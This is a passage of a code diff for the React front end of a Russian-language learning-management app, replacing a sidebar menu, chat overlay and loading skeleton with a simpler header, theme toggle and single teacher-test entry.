          <motion.div animate={{ rotate: -360, x: [0, -50, 0], y: [0, -50, 0] }} transition={{ duration: 40, repeat: Infinity, ease: "linear" }} style={{ position:'absolute', bottom:'-20%', right:'-10%', width:'70vw', height:'70vw', background:'radial-gradient(circle, rgba(142, 197, 252, 0.4) 0%, rgba(0,0,0,0) 70%)', filter: 'blur(60px)', borderRadius:'50%' }} />
          <motion.div animate={{ x: [0, 100, -100, 0], y: [0, -100, 100, 0] }} transition={{ duration: 50, repeat: Infinity, ease: "easeInOut" }} style={{ position:'absolute', top:'30%', left:'30%', width:'40vw', height:'40vw', background:'radial-gradient(circle, rgba(251, 194, 235, 0.3) 0%, rgba(0,0,0,0) 70%)', filter: 'blur(50px)', borderRadius:'50%' }} />
       </div>
-
-      {/* ГАМБУРГЕР КНОПКА (С железобетонной фиксацией через отдельный CSS класс) */}
-      {!isAuthLoading && user && view === 'menu' && (
-          <div className="mobile-burger-fixed">
-              <Button variant="muted" onClick={() => setIsSidebarOpen(true)} style={{width: 54, height: 54, padding: 0, borderRadius: '16px', fontSize: 24, display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 4px 15px rgba(0,0,0,0.1)'}}>☰</Button>
-          </div>
-      )}
-
-      <AnimatePresence>
-          {isSidebarOpen && (
-              <>
-                  <motion.div initial={{opacity:0}} animate={{opacity:1}} exit={{opacity:0}} onClick={() => setIsSidebarOpen(false)} style={{position:'fixed', inset:0, background:'rgba(0,0,0,0.4)', backdropFilter:'blur(5px)', zIndex:2000}} />
-                  <motion.div initial={{x:'-100%'}} animate={{x:0}} exit={{x:'-100%'}} transition={{type:'spring', damping:25, stiffness:200}} className="glass-sidebar" style={{ display: 'flex', flexDirection: 'column', padding: '20px' }}>
-                      {/* Шапка меню (Фиксированная) */}
-                      <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', paddingBottom: 10, borderBottom: '1px solid var(--glass-border)', flexShrink: 0}}>
-                          <h2 style={{margin:0, fontSize: 22}}>Меню</h2>
-                          <Button variant="muted" onClick={() => setIsSidebarOpen(false)} style={{width:44, height:44, padding:0, borderRadius:'50%'}}>✖</Button>
-                      </div>
-                      
-                      {/* Профиль (Фиксированный) */}
-    <div style={{display: 'flex', alignItems: 'center', gap: '15px', padding: '15px 0', borderBottom: '1px solid var(--glass-border)', flexShrink: 0}}>
-    <span style={{ fontSize: '30px' }}>👤</span>
-    
-    {/* Добавили flex: 1 и minWidth: 0, чтобы контейнер не выходил за рамки */}
-    <div style={{ overflow: 'hidden', flex: 1, minWidth: 0 }}>
-        <div style={{ fontSize: '11px', opacity: 0.6, textTransform: 'uppercase', fontWeight: 800 }}>Аккаунт</div>
-        
-        {/* Убрали обрезку текста из родителя и перенесли в отдельный <span> */}
-        <div style={{ fontSize: '15px', fontWeight: 600, color: 'var(--text-main)', display: 'flex', alignItems: 'center', gap: '8px' }}>
-            <span style={{ textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap' }}>
-                {userNickname || user?.email}
-            </span>
-            
-            {/* Добавили flexShrink: 0, чтобы карандаш никогда не сжимался и не исчезал */}
-            <span onClick={changeNickname} style={{cursor: 'pointer', fontSize: 14, opacity: 0.8, flexShrink: 0}} title="Изменить никнейм">
-                ✏️
-            </span>
-        </div>
-    </div>
-</div>
-
-                      {/* Скроллируемая центральная часть с кнопками */}
-                      <div style={{display: 'flex', flexDirection: 'column', gap: '10px', marginTop: 15, flex: 1, overflowY: 'auto', paddingRight: '5px'}}>
-                          <Button variant="muted" onClick={() => setTheme(theme === 'dark' ? 'light' : 'dark')} style={{justifyContent: 'flex-start', padding: '0 20px', height: 54, minHeight: 54}}>
-                              <span style={{marginRight: 10}}>{theme === 'dark' ? '☀️' : '🌙'}</span> Сменить тему
-                          </Button>
-                          <Button variant="teal" onClick={() => { setIsChatOpen(true); setIsSidebarOpen(false); }} style={{justifyContent: 'flex-start', padding: '0 20px', height: 54, minHeight: 54}}>
-                              <span style={{marginRight: 10}}>💬</span> Открыть чат
-                          </Button>
-                          {isAdmin && (
-                              <Button variant="red" onClick={() => { setView('admin'); setIsSidebarOpen(false); }} style={{justifyContent: 'flex-start', padding: '0 20px', height: 54, minHeight: 54}}>
-                                  <span style={{marginRight: 10}}>🛡️</span> АДМИНКА
-                              </Button>
-                          )}
-                      </div>
-
-                      {/* Кнопка ВЫЙТИ (Фиксированная в самом низу) */}
-                      <div style={{paddingTop: '15px', paddingBottom: '10px', flexShrink: 0}}>
-                          <Button variant="muted" onClick={() => { window.auth.signOut(); setIsSidebarOpen(false); }} style={{background: 'rgba(239, 68, 68, 0.1)', color: '#ef4444', height: 54}}>
-                              ВЫЙТИ
-                          </Button>
-                      </div>
-                  </motion.div>
-              </>
-          )}
-      </AnimatePresence>
-
-      <AnimatePresence>
-          {isChatOpen && (
-              <>
-                  <motion.div initial={{opacity:0}} animate={{opacity:1}} exit={{opacity:0}} onClick={() => setIsChatOpen(false)} style={{position:'fixed', inset:0, background:'rgba(0,0,0,0.4)', backdropFilter:'blur(5px)', zIndex:2000}} />
-                  <ChatPanel user={user} onClose={() => setIsChatOpen(false)} />
-              </>
-          )}
-      </AnimatePresence>
+      
+      <div id="themeBtn" onClick={() => setTheme(theme === 'dark' ? 'light' : 'dark')} style={{position:'absolute', top:20, right:20, fontSize:24, width:44, height:44, borderRadius:'50%', background:'var(--glass-bg)', display:'flex', alignItems:'center', justifyContent:'center', cursor:'pointer', zIndex:1000, boxShadow:'0 4px 10px rgba(0,0,0,0.1)'}}>
+        {theme === 'dark' ? '☀️' : '🌙'}
+      </div>
 
       <div style={{minHeight: '100vh', display:'flex', alignItems:'center', justifyContent:'center', padding:'20px 10px'}}>
         <AnimatePresence mode="wait">
           
           {isAuthLoading && (
-              <motion.div key="loading" initial={{opacity:0}} animate={{opacity:1}} exit={{opacity:0}} className="glass-panel" style={{textAlign:'center', width: '100%', maxWidth: '400px', padding: '40px 20px'}}>
-                  <h2 style={{marginBottom: 20}}>Загрузка системы</h2>
-                  <motion.div animate={{ opacity: [0.3, 0.8, 0.3] }} transition={{ duration: 1.5, repeat: Infinity }} style={{ background: 'var(--text-sec)', height: '20px', width: '80%', margin: '0 auto 15px auto', borderRadius: '10px' }} />
-                  <motion.div animate={{ opacity: [0.3, 0.8, 0.3] }} transition={{ duration: 1.5, repeat: Infinity, delay: 0.2 }} style={{ background: 'var(--text-sec)', height: '20px', width: '60%', margin: '0 auto 15px auto', borderRadius: '10px' }} />
-                  <motion.div animate={{ opacity: [0.3, 0.8, 0.3] }} transition={{ duration: 1.5, repeat: Infinity, delay: 0.4 }} style={{ background: 'var(--text-sec)', height: '45px', width: '100%', margin: '0 auto', borderRadius: '14px' }} />
+              <motion.div key="loading" initial={{opacity:0}} animate={{opacity:1}} exit={{opacity:0}} className="glass-panel" style={{textAlign:'center'}}>
+                  <h2>Загрузка системы...</h2>
               </motion.div>
           )}
 
           {!isAuthLoading && !user && <AuthScreen />}
 
+          {/* ВЬЮ ДЛЯ АДМИНКИ */}
           {!isAuthLoading && user && view === 'admin' && (
               <AdminPanel onBack={() => setView('menu')} />
           )}
@@ -1086,7 +707,27 @@ function App() {
           {!isAuthLoading && user && view === 'menu' && (
             <motion.div key="menu" initial={{opacity:0}} animate={{opacity:1}} exit={{opacity:0}} className="glass-panel" style={{width:'100%', maxWidth:'800px'}}>
               
-              <GooeyText texts={["Learn Without Limits", "Build Your Future", "Ultimate LMS Platform"]} style={{margin:'0 0 25px 0', paddingTop: 10}} morphTime={1} cooldownTime={1.5} />
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '25px', paddingBottom: '15px', borderBottom: '1px solid var(--glass-border)' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                      <span style={{ fontSize: '20px' }}>👤</span>
+                      <div style={{ textAlign: 'left', overflow: 'hidden' }}>
+                          <div style={{ fontSize: '11px', opacity: 0.6, textTransform: 'uppercase', fontWeight: 800 }}>Аккаунт</div>
+                          <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--text-main)', textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap', maxWidth: '40vw' }}>{user.email}</div>
+                      </div>
+                  </div>
+                  <div style={{ display: 'flex', gap: '10px' }}>
+                      {isAdmin && (
+                          <Button variant="red" onClick={() => setView('admin')} style={{ width: 'auto', padding: '0 15px', height: '36px', minHeight: '36px', fontSize: '12px', margin: 0, boxShadow: '0 0 15px rgba(239,68,68,0.5)' }}>
+                              🛡️ АДМИНКА
+                          </Button>
+                      )}
+                      <Button variant="muted" onClick={() => window.auth.signOut()} style={{ width: 'auto', padding: '0 15px', height: '36px', minHeight: '36px', fontSize: '12px', margin: 0 }}>
+                          ВЫЙТИ
+                      </Button>
+                  </div>
+              </div>
+
+              <h2 style={{textAlign:'center', fontSize:28, background: 'var(--primary-grad)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', margin:'0 0 25px 0'}}>Ultimate LMS</h2>
               
               <div style={{display:'flex', justifyContent:'center', marginBottom:25}}>
                  <Button variant="orange" style={{maxWidth:300}} onClick={() => setView('stats')}>📊 Статистика</Button>
@@ -1094,16 +735,16 @@ function App() {
 
               <div style={{maxHeight:300, overflowY:'auto', margin:'0 0 20px 0', paddingRight:5}}>
                 
-                {/* ОТОБРАЖАЕМ МНОЖЕСТВО ТЕСТОВ ОТ ПРЕПОДАВАТЕЛЯ */}
-                {teacherTests.map(test => (
-                  <div key={test.id} style={{display:'flex', gap:10, marginBottom:10}}>
-                    <Button variant="muted" onClick={() => openTeacherAssignedTest(test)} style={{ flex:1, justifyContent:'flex-start', textAlign:'left', padding:'10px 15px', minWidth: 0, height: 'auto', minHeight: '54px', wordBreak: 'break-word', border: '1px solid #00c6ff' }}>
+                {/* --- ПЕРСОНАЛЬНЫЙ ТЕСТ ИЗ ОБЛАКА --- */}
+                {teacherTest && (
+                  <div style={{display:'flex', gap:10, marginBottom:10}}>
+                    <Button variant="muted" onClick={() => openTeacherAssignedTest(teacherTest)} style={{ flex:1, justifyContent:'flex-start', textAlign:'left', padding:'10px 15px', minWidth: 0, height: 'auto', minHeight: '54px', wordBreak: 'break-word', border: '1px solid #00c6ff' }}>
                       <span style={{marginRight:8}}>☁️</span>
-                      <span style={{wordBreak:'break-word', lineHeight:'1.3', color: '#00c6ff', fontWeight: 700}}>{test.title}</span>
+                      <span style={{wordBreak:'break-word', lineHeight:'1.3', color: '#00c6ff', fontWeight: 700}}>{teacherTest.title}</span>
                     </Button>
-                    <Button variant="red" style={{width:60, padding:0, flexShrink:0}} onClick={() => removeTeacherTestStudent(test.id, test.title)}>🗑</Button>
+                    <Button variant="red" style={{width:60, padding:0, flexShrink:0}} onClick={removeTeacherTestStudent}>🗑</Button>
                   </div>
-                ))}
+                )}
 
                 {/* --- ЛОКАЛЬНЫЕ ТЕСТЫ --- */}
                 {sets.map(name => (
@@ -1131,7 +772,7 @@ function App() {
               <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:15, marginBottom:25, alignItems:'stretch'}}>
                  <Button variant="primary" onClick={handlePrint}>🖨️ Печать</Button>
                  <label className="import-label" style={{background: 'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)', color:'white'}}>
-                    📥 Импорт <input type="file" style={{display:'none'}} accept=".json" onChange={importJSON} />
+                   📥 Импорт <input type="file" style={{display:'none'}} accept=".json" onChange={importJSON} />
                  </label>
               </div>
               <Button onClick={startTest} style={{fontSize:18, height:60}}>▶ НАЧАТЬ ТЕСТ</Button>
